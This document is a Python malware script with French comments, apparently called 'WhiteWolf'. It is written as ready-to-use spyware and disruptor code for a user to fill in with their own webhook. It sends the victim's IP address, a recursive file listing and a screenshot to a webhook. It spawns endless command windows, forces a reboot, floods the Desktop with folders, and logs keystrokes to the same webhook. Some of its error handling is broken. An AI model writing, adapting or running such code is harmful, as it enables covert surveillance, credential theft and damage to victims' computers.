import os
import time
import requests
import threading
import subprocess
import io
import mss.tools
from pynput import keyboard
import random


red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
white = "\033[37m"
reset = "\033[0m"

os.system("cls")
print(f""" {yellow}
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡠⠖⢉⣌⢆⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣠⠚⠉⠀⠈⠉⠲⣿⣿⡜⡀⠀⠀⠀⠀
            ⡔⢉⣙⣓⣒⡲⠮⡇⠀⠀⠀⠀⠀⠀⠘⡿⡇⡇⠀⠀⠀⠀
            ⡇⠘⣿⣿⣿⠏⠀⠀⠠⣀⡀⠀⠀⠀⠀⡇⠈⠳⡄⠀⠀⠀
            ⢹⠀⢻⣿⠇⠀⠀⣀⣀⠀⡍⠃⠀⠀⣠⣷⡟⢳⡜⡄⠀⠀
            ⠈⣆⠀⠋⢀⢔⣵⣿⠋⠹⣿⠒⠒⠚⠁⣿⣿⣾⣷⢸⠤⡄
            ⠀⡇⠀⠀⢸⢸⣿⣿⣶⣾⡏⡇⠀⠀⢀⡘⣝⠿⡻⢸⡰⠁
            ⠀⢳⠀⠀⠈⢆⠻⢿⡿⠟⡱⠁⠰⠛⢿⡇⠀⠉⠀⡸⠁⠀
            ⠀⠈⢆⠀⠀⠀⠉⠒⠒⣉⡀⠀⠀⢇⠀⡇⠀⠀⢠⠃⠀⠀
            ⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⢉⡱⠀⠀⠉⠀⢀⡴⠁⠀⠀⠀
            ⠀⠀⠀⠀⠈⠓⠦⣀⣉⡉⠁⢀⣀⣠⠤⠒⠥⣄⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠰⣉⣀⣀⡠⠭⠛⠀⠀⠑⠒⠤⠤⠷⠀⠀⠀
⠀⠀⠀⠀⠀⠀
""")
os.system("cls")

webhook = "" # Ici faut placer ton webhook

def dossier():
    while True:
        try:
            ajout = random.randint(1, 100000)
            bureau = os.path.join(os.path.expanduser("~"), "Desktop")
            new_dossier = os.path.join(bureau, f"Virus{ajout}")
     
            os.mkdir(new_dossier)
        except Exception as e:
            print("Error", e)


def cmd():
    while True: 
        try:
            os.system("start cmd")
        except Exception(e):
            print("Une erreur et survenue", e)


def shutdown():
    try:
        os.system("shutdown /r /t 0")
    except Exception(e):
        print("Error", e)


def capture():
    with mss.MSS() as sct:
        img = sct.grab(sct.monitors[1])

        img_bytes = mss.tools.to_png(img.rgb, img.size)

    files = {
        "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
    }

    requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)


def dir():
    try:
        result = subprocess.run("dir /s", shell=True, capture_output=True, text=True)
        contenue = result.stdout[:1900]
        
        data = {
            "content": contenue,
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }
        requests.post(webhook, json=data)
    except Exception as e:
        print("Probleme et survenue", e)
        requests.post(webhook, json={"content": str(e)})


def ip():
    try:
        ip = requests.get("https://checkip.amazonaws.com").text.strip()
        data = {
            "content": ip,
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }
        requests.post(webhook, json=data)
    except ValueError:
        print("Value error")
        time.sleep(3)

ip()
dir()
capture()
cmd()
shutdown()
dossier()

buffer = ""
timer = None

def send_buffer():
    global buffer

    if buffer:
        requests.post(webhook, json={"content": buffer, "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"})
        buffer = ""

def reset_timer():
    global timer

    if timer:
        timer.cancel()

    timer = threading.Timer(1.0, send_buffer)  
    timer.start()

def on_press(key):
    global buffer

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"

    reset_timer()

def start_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

start_listener()
